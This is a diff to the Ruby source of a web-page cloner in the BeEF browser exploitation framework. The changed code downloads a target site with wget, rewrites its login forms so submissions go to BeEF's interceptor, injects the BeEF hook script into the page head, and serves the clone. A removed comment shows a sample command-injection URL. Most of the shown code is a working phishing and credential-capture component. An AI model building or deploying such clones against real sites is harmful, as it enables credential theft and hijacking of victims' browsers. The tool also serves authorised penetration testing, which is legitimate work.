@@ -27,7 +27,7 @@ module BeEF
           @beef_hook = "http://#{@config.get('beef.http.host')}:#{@config.get('beef.http.port')}#{@config.get('beef.http.hook_file')}"
         end
 
-        def clone_page(url, mount)
+        def clone_page(url, mount, use_existing)
           print_info "Cloning page at URL #{url}"
           uri = URI(url)
           output = uri.host
@@ -35,84 +35,94 @@ module BeEF
           user_agent = @config.get('beef.extension.social_engineering.web_cloner.user_agent')
 
           success = false
-          # prevent command injection attacks, passing URLs like (http://antisnatchor'||touch /tmp/foo #). No shells are open in the following case.
-          begin
-            IO.popen(["wget", "#{url}","-c", "-k", "-O", "#{@cloned_pages_dir + output}", "-U", "#{user_agent}","--no-check-certificate","--background"], 'r+') do |wget_io| end
-            success = true
-          rescue Exception => e
-            print_error "Errors executing wget: #{e}"
-            print_error "Looks like wget is not in your PATH. If 'which wget' returns null, it means you don't have 'wget' in your PATH."
-          end
 
-          if success
-            File.open("#{@cloned_pages_dir + output_mod}", 'w') do |out_file|
-              File.open("#{@cloned_pages_dir + output}", 'r').each do |line|
-                # Modify the <form> line changing the action URI to / in order to be properly intercepted by BeEF
-                if line.include?("<form ")
-                  line_attrs = line.split(" ")
-                  c = 0
-                  cc = 0
-                  #todo: probably doable also with map!
+          # Sometimes pages use Javascript/custom logic to submit forms. In these cases even having a powerful parser,
+          # there is no need to implement the complex logic to handle all different cases.
+          # We want to leave the task to modify the xxx_mod file to the BeEF user, and serve it through BeEF after modification.
+          # So ideally, if the the page needs custom modifications, the web_cloner usage will be the following:
+          # 1th request. {"uri":"http://example.com", "mount":"/"} <- clone the page, and create the example.com_mod file
+          # - the user modify the example.com_mod file manually
+          # 2nd request. {"uri":"http://example.com", "mount":"/", "use_existing":"true"} <- serve the example.com_mod file
+          #
+          if use_existing.nil? || use_existing == false
+            begin                                                                                                                      #,"--background"
+              IO.popen(["wget", "#{url}","-c", "-k", "-O", "#{@cloned_pages_dir + output}", "-U", "#{user_agent}","--no-check-certificate"], 'r+') do |wget_io| end
+              success = true
+            rescue Exception => e
+              print_error "Errors executing wget: #{e}"
+              print_error "Looks like wget is not in your PATH. If 'which wget' returns null, it means you don't have 'wget' in your PATH."
+            end
 
-                  # modify the form 'action' attribute
-                  line_attrs.each do |attr|
-                    if attr.include? "action=\""
-                      print_info "Form action found: #{attr}"
-                      break
+            if success
+              File.open("#{@cloned_pages_dir + output_mod}", 'w') do |out_file|
+                File.open("#{@cloned_pages_dir + output}", 'r').each do |line|
+                  # Modify the <form> line changing the action URI to / in order to be properly intercepted by BeEF
+                  if line.include?("<form ")
+                    line_attrs = line.split(" ")
+                    c = 0
+                    cc = 0
+                    #todo: probably doable also with map!
+                    # modify the form 'action' attribute
+                    line_attrs.each do |attr|
+                      if attr.include? "action=\""
+                        print_info "Form action found: #{attr}"
+                        break
+                      end
+                      c += 1
                     end
-                    c += 1
+                    line_attrs[c] = "action=\"#{mount}\""
+
+                    #todo: to be tested, needed in case like yahoo
+                    # delete the form 'onsubmit' attribute
+                    #line_attrs.each do |attr|
+                    #  if attr.include? "onsubmit="
+                    #    print_info "Form onsubmit event found: #{attr}"
+                    #    break
+                    #  end
+                    #  cc += 1
+                    #end
+                    #line_attrs[cc] = ""
+
+                    mod_form = line_attrs.join(" ")
+                    print_info "Form action value changed in order to be intercepted :-D"
+                    out_file.print mod_form
+                    # Add the BeEF hook
+                  elsif line.include?("</head>") && @config.get('beef.extension.social_engineering.web_cloner.add_beef_hook')
+                    out_file.print add_beef_hook(line)
+                    print_info "BeEF hook added :-D"
+                  else
+                    out_file.print line
                   end
-                  line_attrs[c] = "action=\"#{mount}\""
-
-                  #todo: to be tested, needed in case like yahoo
-                  # delete the form 'onsubmit' attribute
-                  #line_attrs.each do |attr|
-                  #  if attr.include? "onsubmit="
-                  #    print_info "Form onsubmit event found: #{attr}"
-                  #    break
-                  #  end
-                  #  cc += 1
-                  #end
-                  #line_attrs[cc] = ""
-
-                  mod_form = line_attrs.join(" ")
-                  print_info "Form action value changed in order to be intercepted :-D"
-                  out_file.print mod_form
-                  # Add the BeEF hook
-                elsif line.include?("</head>") && @config.get('beef.extension.social_engineering.web_cloner.add_beef_hook')
-                  out_file.print add_beef_hook(line)
-                  print_info "BeEF hook added :-D"
-                else
-                  out_file.print line
                 end
               end
             end
-
-            if File.size("#{@cloned_pages_dir + output}") > 0
-              print_info "Page at URL [#{url}] has been cloned. Modified HTML in [cloned_paged/#{output_mod}]"
-
-              file_path = @cloned_pages_dir + output_mod # the path to the cloned_pages directory where we have the HTML to serve
-
-              # Check if the original URL can be framed
-              frameable = is_frameable(url)
-
-              interceptor = BeEF::Extension::SocialEngineering::Interceptor
-              interceptor.set :redirect_to, url
-              interceptor.set :frameable, frameable
-              interceptor.set :beef_hook, @beef_hook
-              interceptor.set :cloned_page, get_page_content(file_path)
-              interceptor.set :db_entry, persist_page(url,mount)
-
-              @http_server.mount("#{mount}", interceptor.new)
-              print_info "Mounting cloned page on URL [#{mount}]"
-              @http_server.remap
-              success = true
-            else
-              print_error "Error cloning #{url}. Be sure that you don't have errors while retrieving the page with 'wget'."
-              success = false
-            end
           end
-            success
+
+          if File.size("#{@cloned_pages_dir + output}") > 0
+            print_info "Page at URL [#{url}] has been cloned. Modified HTML in [cloned_paged/#{output_mod}]"
+
+            file_path = @cloned_pages_dir + output_mod # the path to the cloned_pages directory where we have the HTML to serve
+
+            # Check if the original URL can be framed
+            frameable = is_frameable(url)
+
+            interceptor = BeEF::Extension::SocialEngineering::Interceptor
+            interceptor.set :redirect_to, url
+            interceptor.set :frameable, frameable
+            interceptor.set :beef_hook, @beef_hook
+            interceptor.set :cloned_page, get_page_content(file_path)
+            interceptor.set :db_entry, persist_page(url,mount)
+
+            @http_server.mount("#{mount}", interceptor.new)
+            print_info "Mounting cloned page on URL [#{mount}]"
+            @http_server.remap
+            success = true
+          else
+            print_error "Error cloning #{url}. Be sure that you don't have errors while retrieving the page with 'wget'."
+            success = false
+          end
+
+          success
         end
 
         private
